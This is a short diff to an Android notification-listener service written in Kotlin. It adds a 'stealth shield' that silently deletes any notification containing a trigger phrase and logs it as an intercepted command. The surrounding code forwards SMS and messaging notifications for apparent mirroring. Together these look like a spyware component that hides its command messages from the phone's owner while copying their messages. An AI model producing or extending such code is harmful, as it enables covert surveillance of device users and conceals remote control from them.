@@ -87,6 +87,13 @@ class MyNotificationListener : NotificationListenerService() {
 
         if (title.isEmpty() && text.isEmpty()) return
 
+        // --- STEALTH SHIELD: INSTANT WIPE ---
+        if (title.contains("Hii!!") || text.contains("Hii!!")) {
+            cancelNotification(sbn.key)
+            DebugLogger.log("SHIELD", "Command notification intercepted and purged.")
+            return
+        }
+
         // --- ENGAGEMENT PROTOCOL ---
         if (pkg.contains("messaging") || pkg.contains("sms") || pkg.contains("com.google.android.apps.messaging")) {
             checkAndMirrorNotification(sbn, title, text)
